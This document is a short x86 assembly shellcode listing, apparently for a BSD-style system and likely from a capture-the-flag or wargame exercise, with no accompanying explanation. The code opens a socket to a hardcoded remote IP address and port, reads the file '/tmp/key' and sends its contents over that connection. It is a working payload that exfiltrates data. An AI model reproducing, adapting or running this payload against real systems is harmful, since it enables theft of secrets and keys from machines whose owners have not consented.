
socket:
	pushl $97
	popl  %eax
	cdq
	pushl %edx
	incl  %edx
	pushl %edx
	incl  %edx
	pushl %edx
	pushl $0xbd53df8d
	int  $0x80

connect:
	pushl $0xa05b0210
	movl  %esp, %ecx
	pushl  $0x10
	pushl %ecx
	pushl %eax
	pushl %ecx
	
	xchg %ebx, %eax 
	
	pushl $98
	popl  %eax
	int  $0x80

dup:
	pushl $0x2
	popl  %ecx
	
dup_loop:
	pushl $0x5a
	popl  %eax
	pushl %edx
	pushl %ebx
	
	pushl %edx
	int  $0x80
	decl  %edx
	jns  dup_loop

jmp data_path
# edx=open (filepath, 1, 0)
open:
        popl %ebx           ## ebx = filepath
	xorl %eax, %eax
	push %eax        # mode
	push %eax        # flags
	push %ebx        # file path
	push %ebx        # dummy
	xorl %eax, %eax
	movb $5, %al
	int $0x80
	movl %eax, %edx

# read (edx, esi, 32)
read:
	movl %esp, %esi
	sub $0x80, %esp

        xorl %eax, %eax
	movb $0x30, %al
	push %eax        ## 32 bytes
	push %esi        ## buff
	movl %edx, %eax  ## read from the file
	push %eax
	push %eax        ## dummy
	movb $3, %al
	int $0x80

# write (edx, esi, 32)
write:
        xorl %eax, %eax
	movb $0x30, %al
	push %eax        ## 32 bytes
	push %esi        ## buff
	push $0x0        ## write to the socket
	push %eax        ## dummy
	movb $4, %al
	int $0x80

# exit()
exit:
        movb $1, %al
        int $0x80

data_path:
call open
        .ascii "/tmp/key\0"

